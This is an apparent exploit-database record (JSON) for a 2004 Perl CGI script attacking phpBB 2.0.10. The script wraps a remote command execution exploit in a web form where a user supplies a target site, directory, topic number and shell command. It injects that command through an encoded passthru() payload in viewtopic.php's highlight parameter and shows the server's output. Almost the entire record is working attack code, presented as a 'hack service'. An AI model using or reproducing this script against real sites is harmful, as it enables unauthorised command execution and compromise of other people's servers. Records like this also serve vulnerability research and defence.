{
  "id": "673",
  "title": "phpBB 2.0.10 - Remote Command Execution (CGI)",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\n#wphpbb.cgi \r\n#hack service:)\r\n#http://site/cgi-bin/wphpbb.cgi\r\n\r\nuse CGI qw(:standard); \r\n$CGI::HEADERS_ONCE = 1; \r\n$CGI = new CGI; \r\n\r\n$atak = $CGI->param(\"atak\"); \r\n$serv = $CGI->param(\"serv\");\r\n$dir = $CGI->param(\"dir\"); \r\n$topic = $CGI->param(\"topic\"); \r\n$cmd = $CGI->param(\"cmd\"); \r\n\r\nprint $CGI->header(-type=>'text/html',-charset=>'windows-1254'); \r\nprint qq~<html><head> <meta http-equiv=Content-Type\" content=text/html; charset=ISO-8859-9><title>phpBB HACK</title></head> \r\n<body bgcolor=black text=red>phpBB atak webscript<br>\r\n<font color=blue>exploit:by RusH security team // www.rst.void.ru<br>\r\nexploit update:ZzagorR</font><br>\r\n<table align=left><tr>\r\n<form action=? method=post>\r\n<input type=hidden name=atak value=phpbb>\r\n<td>Site: </td><td><input type=text name=serv value=$serv size=50><br><font color=blue>example: www.site.com</font></td></tr>\r\n<tr><td>Klasor: </td><td><input type=text name=dir value=$dir size=50><br><font color=blue>example: /phpBB2/</font></td></tr>\r\n<tr><td>TopicNo: </td><td><input type=text name=topic value=$topic size=10><br><font color=blue>example: 1</font></td></tr>\r\n<tr><td>Komut: </td><td><input type=text name=cmd value=$cmd size=100><br><font color=blue>example: id</font></td></tr>\r\n<tr><td colspan=2 align=center><input type=submit value=\"Test\"></td></tr>~; \r\n\r\nif($atak eq \"phpbb\") { \r\n\r\n\r\n\r\n$serv =~ s/(http:\\/\\/)//eg;\r\nprint \"<tr><td valign=top colspan=2><font color=white> Sonuclar</font></td></tr>\"; \r\n$cmd=~ s/(.*);$/$1/eg;\r\n$cmd=~ s/(.)/\"%\".uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n$topic=~ s/(.)/\"%\".uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n$path  = $dir;\r\n$path .= 'viewtopic.php?t=';\r\n$path .= $topic;\r\n$path .= '&rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20';\r\n$path .= $cmd;\r\n$path .= '%3B%20%65%63%68%6F%20%5F%45%4E%44%5F';\r\n$path .= '&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527';\r\nuse IO::Socket;\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$serv\", PeerPort => \"80\") || die \"[-] CONNECT FAILED\\r\\n\";\r\nprint $socket \"GET $path HTTP/1.1\\n\";\r\nprint $socket \"Host: $serv\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\n$on = 0;\r\nwhile ($answer = <$socket>)\r\n {\r\n  if ($answer =~ /^_END_/) { print \"<tr><td colspan=2 valign=top><font color=white>Islem Sonu</font></td></tr>\\r\\n\"; exit(); }\r\n  if ($on == 1) { print \"<tr><td colspan=2 valign=top>$answer</td></tr>\"; }\r\n  if ($answer =~ /^_START_/) { $on = 1; }\r\n }\r\n\r\n\r\nprint \"[-] EXPLOIT BASARISIZ\\r\\n\";\r\nprint \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\r\\n\";\r\n}\r\n\r\nprint \"</table></body></html>\";\r\n\r\n# milw0rm.com [2004-12-03]",
  "url": "https://www.exploit-db.com/exploits/673"
}